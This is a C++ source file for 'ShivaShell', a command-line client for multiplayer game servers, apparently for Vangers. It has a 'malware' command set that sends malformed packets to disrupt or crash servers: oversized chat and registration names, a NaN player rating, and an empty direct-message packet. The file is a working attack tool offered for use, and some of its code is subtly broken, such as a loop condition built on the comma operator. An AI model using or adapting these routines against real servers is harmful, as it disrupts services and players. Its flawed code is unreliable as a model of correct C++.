#include "ShivaShell.h"

namespace ShivaShell
{
	// Local variables storage
	namespace Local
	{
		// Constants and variables that are created on initialization stage.
		namespace Const {
			ServerData passemblosMainData;

			std::string helpText;
			std::string overflowText;
		}

		fStringStream commlineParser;
		bool abortSession = false;

		unsigned int maskSend2Everyone;

		ShivaState currentState = ShivaState::Calm;

		DefaultServersMap defaultServers;
		DefaultServerInfo* currentServerDefaultInfo = 0;
	}
}

void ShivaShell::run()
{
	init();
	while (!Local::abortSession) {
		tick();
	}
}

void ShivaShell::init()
{
	// initializating other modules
	audioUtil.init();
	Local::defaultServers.load();

	// initializating myself
	createPassemblosTemplate();
	createOverflowText();
	loadHelpText();

	// initialization ended
	printWelcomeText();
}

void ShivaShell::tick()
{
	std::cout << '>';
	parseCommand(getCommand());
	serverSocket.processPacketStack();
}

void ShivaShell::createPassemblosTemplate()
{
	Local::Const::passemblosMainData.GameType = PASSEMBLOSS;

	Local::Const::passemblosMainData.Passembloss.ArtefactsUsing = 0;
	Local::Const::passemblosMainData.Passembloss.CheckpointsNumber = INT_MAX;
	Local::Const::passemblosMainData.Passembloss.Color = 0;
	Local::Const::passemblosMainData.Passembloss.InEscaveTime = INT_MAX;
	Local::Const::passemblosMainData.Passembloss.InitialCash = INT_MAX;
	Local::Const::passemblosMainData.Passembloss.RandomEscave = 0;
}

void ShivaShell::loadHelpText()
{
	fFile helpTextFile("data/helpText.txt", fFile::AS_INPUT);
	Local::Const::helpText = helpTextFile.fileData;
}

void ShivaShell::createOverflowText()
{
	for(int i = 0; i < 500; i++)
	{
		Local::Const::overflowText += ' ';
	}
}

void ShivaShell::printWelcomeText()
{
	std::cout
		<< "SHIVASHELL::v0x1\n"
		<< "Enter '.help' to print shell help.\n";
}

std::string ShivaShell::getCommand()
{
	std::string commline;
	std::getline(std::cin, commline);
	convertBytes(commline);
	return commline;
}

void ShivaShell::convertBytes(std::string &string)
{
	size_t slashPos;
	size_t nextSlash;
	size_t readPos = 0;

	while((slashPos = string.find('\\'), readPos) != std::string::npos)
	{
		nextSlash = string.find('\\', slashPos+1); 
		if(nextSlash == std::string::npos) return;

		// double slashes
		if(nextSlash == slashPos + 1){
			string.erase(nextSlash, 1);
			readPos = nextSlash;
			continue;
		}

		//...\number\....
		//    ^    ^
		//substr only number part
		std::string strByteValue = string.substr(slashPos+1, (nextSlash-slashPos)-1);
		string.erase(slashPos, (nextSlash-slashPos)+1);

		char totalByte = atoi(strByteValue.data());

		string.insert(string.begin() + slashPos, totalByte);

		readPos = slashPos+1;
	}
}

void ShivaShell::parseCommand(const std::string& commline)
{
	std::string word;

	Local::commlineParser.resetString(commline);

	while (Local::commlineParser.tryReadWord(word)) {
		routeCmdName(word);
	}
}

#define cmdcase(cmdstr, cmdfnc) if(cmd == cmdstr) { cmdfnc(); break; }
#define cmdcase_malware(cmdstr, cmdfnc) if(cmd == cmdstr) { if(isServerCanBeAttacked()) { cmdfnc(); } break; }

void ShivaShell::routeCmdName(std::string& cmd)
{
	int i, j;

	char prefix = cmd[0];
	cmd.erase(0, 1);

	for (char &c : cmd) {
		c = std::tolower(c);
	}

	switch (prefix) {
	default:
		std::cout << "Unknown command branch prefix: " << prefix << '\n';
		break;
	case '.': // global
		cmdcase("help", dc_Help);
		cmdcase("shtd", dc_Shtd);
		cmdcase("abrt", dc_Abrt);
		cmdcase("pstdmp", dc_Pstdmp);
		cmdcase("mtaux", dc_Mtaux);
		cmdcase("mtaud", dc_Mtaud);

		std::cout << "Unknown global command: " << cmd << '\n';
		break;
	case 's': // server
		cmdcase("cn", dcScn);
		cmdcase("dc", dcSdc);
		cmdcase("st", dcSst);
		cmdcase("gl", dcSgl);
		cmdcase("map", dcSmap);

		std::cout << "Unknown server command: " << cmd << '\n';
		break;
	case 'g': // game
		cmdcase("cn", dcGcn);
		cmdcase("pl", dcGpl);
		cmdcase("reg", dcGreg);
		cmdcase("ms", dcGms);

		std::cout << "Unknown game command: " << cmd << '\n';
		break;
	case 'm': // malware
		cmdcase_malware("msw", dcMmsw);
		cmdcase_malware("urw", dcMurw);
		cmdcase_malware("nni", dcMnni);
		cmdcase_malware("msi", dcMmsi);

		std::cout << "Unknown malware command: " << cmd << '\n';
		break;
	}
}

bool ShivaShell::isServerCanBeAttacked()
{
	switch (Local::currentState) {
	case ShivaState::Calm:
	case ShivaState::Attack:
		if (Local::currentServerDefaultInfo) {
			if (Local::currentServerDefaultInfo->flags & DSF_Deprecated) {
				audioUtil.set(TID_DprAttackIntro);

				std::cout
					<< "WARNING::You are trying to use malware at deprecated server.\n"
					<< "Are you sure? [y/n]: ";

				char answer;
				std::cin >> answer;

				if (answer == 'y' || answer == 'Y') {
					Local::currentState = DprAttack;
					audioUtil.set(TID_DprAttackMain);
					return 1;
				}
				audioUtil.set(TID_Calm);
				return 0;
			}
			if(Local::currentState != Attack) {
				Local::currentState = Attack;
				audioUtil.set(TID_NormalAttack);
			}
		}
		return 1;
	case ShivaState::DprAttack:
		return 1;
	}
	
	return 0;
}


/// Commands definitions


#define REQARG(argname) if(!(Local::commlineParser.tryReadAny(argname))) { std::cout<<"command failed - no "#argname" arg\n"; return; }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    

void ShivaShell::dc_Help()
{
	std::cout << Local::Const::helpText << '\n';
}

void ShivaShell::dc_Shtd() 
{
	Local::abortSession = 1;

	serverSocket.disconnect();
}

void ShivaShell::dc_Abrt() 
{
	std::abort();
}

void ShivaShell::dc_Pstdmp()
{
	std::cout << "size=" << inputPacketsStream.packetStack.size() << '\n';

	std::string strnum;
	for (VPacket& packet : inputPacketsStream.packetStack) {
		std::cout << "- [" << packet.size() << "]{";
		
		for (const char& byte : packet) {

			strnum = std::to_string((int)((unsigned char)byte));
			for (int j = 3; j > strnum.size(); j--) {
				strnum.insert(strnum.begin(), '0');
			}

			std::cout << strnum << ',';
		}
		std::cout << "}\n";
	}
}

void ShivaShell::dc_Mtaux()
{
	std::string isMutedArg;

	REQARG(isMutedArg);

	bool isMuted = atoi(isMutedArg.data());

	serverSocket.ignoreAuxiliaries = isMuted;
}

void ShivaShell::dc_Mtaud()
{
	std::string isMutedArg;

	REQARG(isMutedArg);

	bool isMuted = atoi(isMutedArg.data());

	if(isMuted){
		audioUtil.stream.pause();
	}
	else{
		audioUtil.stream.play();
	}
}

void ShivaShell::dcScn()
{
	ServerInfo connectInfo;
	std::string word;

	REQARG(connectInfo.IP);

	if (Local::commlineParser.tryReadAny(word)) {
		connectInfo.Port = atoi(word.c_str());
	}
	else {
		connectInfo.Port = 2197;
	}

	Local::currentServerDefaultInfo = 0;

	if (serverSocket.connect(connectInfo)) {

		for (DefaultServerInfo& defServer : Local::defaultServers.servers) {
			if (defServer.name == connectInfo.IP && defServer.port == connectInfo.Port) {
				Local::currentServerDefaultInfo = &defServer;
				break;
			}
		}

		Local::maskSend2Everyone = 0xffffffff & ~(1 << (serverSocket.myPlayerID - 1));

		std::cout << "connected...\n";
		return;
	}

	std::cout << "connection failed!\n";
}

void ShivaShell::dcSdc()
{
	serverSocket.disconnect();
	std::cout << "disconnected...\n";
}

#define PRINT_SERVER_PRM(prm) std::cout<<#prm"="<<serverSocket.prm<<'\n';

void ShivaShell::dcSst()
{
	std::cout << "server connector status:\n";
	if (serverSocket.connectedServer) 
	{
		PRINT_SERVER_PRM(connectedServer->IP);
		PRINT_SERVER_PRM(connectedServer->Port);
		std::cout << "connectedServer-->realIP=" << serverSocket.socket.getRemoteAddress() << '\n';

		if(serverSocket.connectedGame)
		{
			PRINT_SERVER_PRM(connectedGame->ID);
			PRINT_SERVER_PRM(connectedGame->name);
		}
	}
	else
	{
		std::cout<<"no connection";
	}

}
void ShivaShell::dcSgl()
{

	std::cout << "updating...\n";
	serverSocket.updateGamesList();
	std::cout << "updated\n";

	if (serverSocket.serverGames.empty()) {
		std::cout << "<no any>\n";
		return;
	}

	for (const GameInfo& gameInfo : serverSocket.serverGames) {

		std::cout	<< "-+-NAME->" << gameInfo.name << '\n'
					<< " +-ID--->" << gameInfo.ID << '\n';

	}
}


void ShivaShell::dcSmap()
{
	Local::defaultServers.print();
}

void ShivaShell::dcGcn()
{
	std::string gameIDArg;
	int gameID;
	
	REQARG(gameIDArg);

	gameID = atoi(gameIDArg.data());

	if (!serverSocket.connect2Game(gameID)) {
		std::cout << "connection failed...\n";
		return;
	}
	std::cout << "connected\n";
}

void ShivaShell::dcGpl()
{
	bool printBody = 0;
	std::string printBodyArg;

	Local::commlineParser.tryReadAny(printBodyArg);

	printBody = atoi(printBodyArg.data());

	serverSocket.updatePlayersList();

	if (serverSocket.gamePlayers.empty()) {
		std::cout << "<no any>\n";
		return;
	}

	for (PlayerInfo& player : serverSocket.gamePlayers) {
		std::cout
			<< "-+-NAME----->" << player.name << '\n'
			<< " +-ID------->" << (int)player.ID << '\n'
			<< " +-STATUS--->" << (int)player.status << '\n'
			<< " +-WORLDID-->" << (int)player.worldID << '\n'
			<< " +-POSITION->" << player.X << ", " << player.Y << '\n';

		if (printBody) {
			std::cout
				<< " +-BODY-+-BEEBOS--->" << player.body.beebos << '\n'
				<< "        +-KILLS---->" << (int)player.body.kills << '\n'
				<< "        +-DEATHS--->" << (int)player.body.deaths << '\n'
				<< "        +-COLOR---->" << (int)player.body.color << '\n'
				<< "        +-NETID---->" << player.body.NetID << '\n'
				<< "        +-CARINDEX->" << (int)player.body.CarIndex << '\n'
				<< "        +-WORLD---->" << (int)player.body.world << '\n'
				<< "        +-RATING--->" << player.body.rating << '\n';
		}
	}
}

void ShivaShell::dcGreg()
{
	VPacket registerPacket(REGISTER_NAME);
	std::string name, password;

	REQARG(name);
	REQARG(password);

	registerPacket += name + '\0';
	registerPacket += password + '\0';

	registerPacket.sendToServer();
}

void ShivaShell::dcGms()
{
	VPacket messagePacket(DIRECT_SENDING);
	messagePacket.writeAny(Local::maskSend2Everyone);

	std::string text;

	REQARG(text);

	messagePacket += text + '\0';
	messagePacket.sendToServer();
}

void ShivaShell::dcMmsw()
{
	VPacket sendMessagePacket(DIRECT_SENDING);

	// overflow message's text
	sendMessagePacket += Local::Const::overflowText + '\0';
	sendMessagePacket.sendToServer();
}

void ShivaShell::dcMurw()
{
    VPacket sendRegisterNamePacket(REGISTER_NAME);

	// overflowed name
	sendRegisterNamePacket += Local::Const::overflowText + '\0';
	// passwords are stored on server so its senseless to overflow them
	sendRegisterNamePacket += ' ' + '\0';
	sendRegisterNamePacket.sendToServer();
}

void ShivaShell::dcMnni()
{
	VPacket sendBodyPacket(SET_PLAYER_DATA);

	PlayerBody myBody;
	myBody.rating = std::nanf("");

	sendBodyPacket.writeAny(myBody);

	sendBodyPacket.sendToServer();
}

void ShivaShell::dcMmsi()
{
	VPacket messagePacket(DIRECT_SENDING);
	messagePacket.writeAny(Local::maskSend2Everyone);
	messagePacket.sendToServer();
}

